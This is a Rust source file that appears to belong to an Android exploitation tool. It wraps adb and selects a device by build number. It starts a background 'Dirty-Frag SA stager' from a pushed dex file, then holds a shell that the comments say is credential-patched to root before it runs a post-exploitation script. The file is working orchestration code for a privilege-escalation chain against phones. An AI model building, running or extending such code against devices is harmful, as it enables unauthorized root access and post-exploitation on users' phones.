// adb wrapper + background Stager / WaitShell. Shells out to the `adb` binary (unavoidable).
#![allow(dead_code)]
use std::io::{BufRead, BufReader, Read};
use std::process::{Child, Command, Stdio};
use std::time::{Duration, Instant};

pub struct Adb { pub serial: String }

impl Adb {
    pub fn new(serial: &str) -> Adb { Adb { serial: serial.to_string() } }

    fn base(&self) -> Command {
        let mut c = Command::new("adb");
        c.arg("-s").arg(&self.serial);
        c
    }
    /// run adb with args, return (stdout+stderr merged? no: stdout) trimmed
    fn out(&self, args: &[&str]) -> String {
        let o = self.base().args(args).output();
        match o {
            Ok(o) => String::from_utf8_lossy(&o.stdout).trim().to_string(),
            Err(_) => String::new(),
        }
    }
    pub fn sh(&self, cmd: &str) -> String { self.out(&["shell", cmd]) }
    pub fn su(&self, cmd: &str) -> String { self.out(&["shell", &format!("su -c \"{}\"", cmd)]) }
    pub fn getprop(&self, p: &str) -> String { self.sh(&format!("getprop {}", p)) }
    pub fn alive(&self) -> bool { self.out(&["get-state"]) == "device" }
    pub fn push(&self, local: &str, remote: &str) -> bool {
        self.base().args(["push", local, remote]).stdout(Stdio::null()).stderr(Stdio::null()).status().map(|s| s.success()).unwrap_or(false)
    }
    pub fn reboot(&self) { let _ = self.base().arg("reboot").status(); }
    pub fn wait_for_device(&self) { let _ = self.base().arg("wait-for-device").status(); }

    /// dd if=path bs=1 skip=off count=n | base64  -> decoded bytes
    pub fn read_region(&self, path: &str, off: u64, n: usize) -> Vec<u8> {
        let cmd = format!("dd if={} bs=1 skip={} count={} 2>/dev/null | base64", path, off, n);
        let s = self.sh(&cmd);
        b64decode(&s)
    }
}

pub fn pick_device(want_build: &str, override_serial: Option<&str>) -> String {
    let out = Command::new("adb").arg("devices").output().map(|o| String::from_utf8_lossy(&o.stdout).into_owned()).unwrap_or_default();
    let serials: Vec<String> = out.lines().skip(1)
        .filter(|l| l.contains("\tdevice"))
        .map(|l| l.split('\t').next().unwrap_or("").to_string())
        .filter(|s| !s.is_empty())
        .collect();
    if let Some(o) = override_serial {
        if !serials.iter().any(|s| s == o) { crate::log::die(&format!("device {} not connected", o)); }
        return o.to_string();
    }
    for s in &serials {
        if Adb::new(s).getprop("ro.build.version.incremental") == want_build { return s.clone(); }
    }
    crate::log::die(&format!("no connected device matches build {}; use --device", want_build));
}

// ---- background Dirty-Frag SA stager ----
pub struct Stager { serial: String, child: Option<Child>, pub port: Option<u16> }
impl Stager {
    pub fn new(serial: &str) -> Stager { Stager { serial: serial.to_string(), child: None, port: None } }
    pub fn start(&mut self) -> Option<u16> {
        let mut child = Command::new("adb").args(["-s", &self.serial, "shell",
            "cd /data/local/tmp && CLASSPATH=e2e.dex exec app_process / q3.Stager 1800"])
            .stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().ok()?;
        let stdout = child.stdout.take()?;
        let mut reader = BufReader::new(stdout);
        let deadline = Instant::now() + Duration::from_secs(30);
        let mut line = String::new();
        while Instant::now() < deadline {
            line.clear();
            match reader.read_line(&mut line) {
                Ok(0) => break,
                Ok(_) => {
                    if let Some(p) = line.find("ENCAPPORT=") {
                        let rest = &line[p + 10..];
                        let num: String = rest.chars().take_while(|c| c.is_ascii_digit()).collect();
                        if let Ok(v) = num.parse::<u16>() {
                            // keep the reader draining in the background so the pipe never blocks
                            std::thread::spawn(move || { let mut sink = Vec::new(); let _ = reader.get_mut().read_to_end(&mut sink); });
                            self.port = Some(v);
                            self.child = Some(child);
                            return Some(v);
                        }
                    }
                }
                Err(_) => break,
            }
        }
        let _ = child.kill();
        None
    }
    pub fn stop(&mut self) {
        if let Some(mut c) = self.child.take() { let _ = c.kill(); let _ = c.wait(); }
    }
}
impl Drop for Stager { fn drop(&mut self) { self.stop(); } }

// ---- waiting shell (cred-patched to root, then runs postex.sh) ----
pub struct WaitShell { serial: String, child: Option<Child>, pub pid: Option<i64>, skip: String, mods: String }
impl WaitShell {
    pub fn new(serial: &str, skip_magisk: bool, carrier_mods: &str) -> WaitShell {
        WaitShell { serial: serial.to_string(), child: None, pid: None,
                    skip: if skip_magisk { "1" } else { "0" }.to_string(), mods: carrier_mods.to_string() }
    }
    pub fn start(&mut self) -> Option<i64> {
        let _ = Command::new("adb").args(["-s", &self.serial, "shell",
            "rm -f /data/local/tmp/pepid /data/local/tmp/pego /data/local/tmp/postex_done"]).status();
        let cmd = format!(
            "echo $$ > /data/local/tmp/pepid; while [ ! -f /data/local/tmp/pego ]; do sleep 0.2; done; \
             SKIP_MAGISK={} CARRIER_MODS='{}' sh /data/local/tmp/postex.sh", self.skip, self.mods);
        let child = Command::new("adb").args(["-s", &self.serial, "shell", &cmd])
            .stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().ok()?;
        self.child = Some(child);
        for _ in 0..50 {
            let pid = Command::new("adb").args(["-s", &self.serial, "shell", "cat /data/local/tmp/pepid 2>/dev/null"])
                .output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default();
            if !pid.is_empty() && pid.chars().all(|c| c.is_ascii_digit()) {
                self.pid = pid.parse().ok();
                return self.pid;
            }
            std::thread::sleep(Duration::from_millis(200));
        }
        None
    }
    pub fn release(&self) { let _ = Command::new("adb").args(["-s", &self.serial, "shell", "touch /data/local/tmp/pego"]).status(); }
    pub fn stop(&mut self) { if let Some(mut c) = self.child.take() { let _ = c.kill(); let _ = c.wait(); } }
}
impl Drop for WaitShell { fn drop(&mut self) { self.stop(); } }

// ---- minimal base64 decode ----
fn b64decode(s: &str) -> Vec<u8> {
    let mut t = [255u8; 256];
    for (i, c) in b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".iter().enumerate() {
        t[*c as usize] = i as u8;
    }
    let mut out = Vec::new();
    let mut buf = 0u32;
    let mut bits = 0;
    for &c in s.as_bytes() {
        if c == b'=' { break; }
        let v = t[c as usize];
        if v == 255 { continue; } // skip whitespace/newlines
        buf = (buf << 6) | v as u32;
        bits += 6;
        if bits >= 8 { bits -= 8; out.push((buf >> bits) as u8); }
    }
    out
}
